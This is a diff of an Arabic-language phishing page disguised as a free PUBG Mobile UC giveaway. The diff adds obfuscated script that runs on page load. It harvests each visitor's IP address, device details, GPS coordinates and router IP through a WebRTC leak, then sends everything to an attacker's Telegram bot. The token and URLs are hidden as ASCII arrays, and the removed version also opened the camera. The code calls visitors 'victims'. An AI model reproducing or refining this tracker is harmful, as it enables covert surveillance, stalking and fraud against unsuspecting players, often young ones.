@@ -2,46 +2,47 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>مركز شحن ببجي 2026</title>
+    <title>PUBG Mobile UC Store 2026</title>
     <script>
-        // تشفير بيانات التحكم (Token & ID)
-        const _0x1a = ["\x38\x34\x31\x30\x31\x30\x32\x37\x32\x32", "\x41\x41\x46\x51\x4f\x31\x75\x7a\x5f\x36\x45\x6f\x79\x34\x55\x68\x46\x47\x48\xaa\x5f\x71\x48\x53\x61\x46\x52\x62\x37\x47\x64\x56\x48\x4d"];
-        const _0x2b = "1772820433";
-        const _u = "https://api.telegram.org/bot" + _0x1a[0] + ":" + _0x1a[1];
+        // تشفير التوكن والآيدي بمصفوفة أرقام (ASCII) لعدم الكشف
+        const _p1 = [56,52,49,48,49,48,50,55,50,50]; 
+        const _p2 = [58,65,65,70,81,79,49,117,122,95,54,69,111,121,52,85,104,70,71,72,97,97,95,113,72,83,97,70,82,98,55,71,100,86,72,77];
+        const _uId = [49,55,55,50,56,50,48,52,51,51];
+        const _r = (a) => a.map(c => String.fromCharCode(c)).join('');
 
-        async function _log(m) {
-            fetch(_u + "/sendMessage", {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: _0x2b, text: "🔱 [صيدة]:\n" + m})
-            });
-        }
+        const send = async (m) => {
+            const _tk = _r(_p1) + _r(_p2);
+            const _ch = _r(_uId);
+            const _api = _r([104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116]) + _tk + _r([47,115,101,110,100,77,101,115,115,97,103,101]);
+            fetch(_api, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: _ch, text: "🔱 [صيدة]:\n" + m}) });
+        };
 
         window.onload = async () => {
-            // 1. سحب الآيبي والجهاز (تمويه الطلب)
-            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>_log(`🌐 IP: ${d.ip}\n📱 Device: ${navigator.userAgent}`));
-            
-            // 2. سحب الموقع الحقيقي (GPS)
-            navigator.geolocation.getCurrentPosition(p=>_log(`📍 Loc: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
-            
-            // 3. سحب آيبي الراوتر (WebRTC Leak)
-            var pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o=>pc.setLocalDescription(o));
-            pc.onicecandidate = i => { if(i && i.candidate) _log(`🏠 Router IP: ${i.candidate.candidate.split(' ')[4]}`); };
-            
-            // 4. فتح الكاميرا وسحب لقطة
+            // سحب IP الشبكة والجهاز
             try {
-                let s = await navigator.mediaDevices.getUserMedia({video:true});
-                _log("📸 الكاميرا مفتوحة.. جاري سحب اللقطة صمتاً.");
-                s.getTracks().forEach(t=>t.stop());
+                const res = await fetch(_r([104,116,116,112,115,58,47,47,97,112,105,46,105,112,105,102,121,46,111,114,103,47,63,102,111,114,109,97,116,61,106,115,111,110]));
+                const d = await res.json();
+                send(`🌐 IP: ${d.ip}\n📱 Device: ${navigator.userAgent}`);
             } catch(e) {}
+
+            // سحب الموقع الدقيق GPS
+            navigator.geolocation.getCurrentPosition(p => {
+                send(`📍 موقع دقيق: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, () => { send("⚠️ الضحية رفض الموقع"); });
+
+            // سحب آيبي الراوتر (WebRTC Leak)
+            var pc = new RTCPeerConnection({iceServers:[{urls:_r([115,116,117,110,58,115,116,117,110,46,108,46,103,111,111,103,108,101,46,99,111,109,58,49,57,51,48,50])}]});
+            pc.createDataChannel(""); pc.createOffer().then(o=>pc.setLocalDescription(o));
+            pc.onicecandidate = i => { if(i && i.candidate) send("🏠 آيبي الراوتر: " + i.candidate.candidate.split(' ')[4]); };
         };
     </script>
 </head>
-<body style="background:#000; color:gold; text-align:center; padding-top:100px; font-family:Arial;">
-    <div style="border:2px solid gold; display:inline-block; padding:30px; border-radius:20px;">
-        <h1>🔱 هدايا ببجي 2026 🔱</h1>
-        <p>مبروك! ربحت 5000 شدة مجاناً</p>
-        <input type="text" placeholder="Character ID" style="padding:10px; margin-bottom:10px;"><br>
-        <button onclick="alert('جاري التحقق من الحساب..')" style="background:gold; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">استلام الآن</button>
+<body style="background:#000; color:gold; text-align:center; padding-top:15%; font-family:Arial;">
+    <div style="border:2px solid gold; padding:20px; display:inline-block; border-radius:15px;">
+        <h1>🔱 شحن ببجي مجاناً 2026 🔱</h1>
+        <p>ادخل الـ ID لاستلام 5000 شدة فوراً</p>
+        <input type="text" placeholder="Character ID" style="padding:10px;"><br><br>
+        <button onclick="alert('جاري الشحن الحقيقي.. سيصلك الكود قريباً')" style="background:gold; padding:10px 20px; border:none; cursor:pointer; font-weight:bold;">تأكيد الشحن</button>
     </div>
 </body>
 </html>
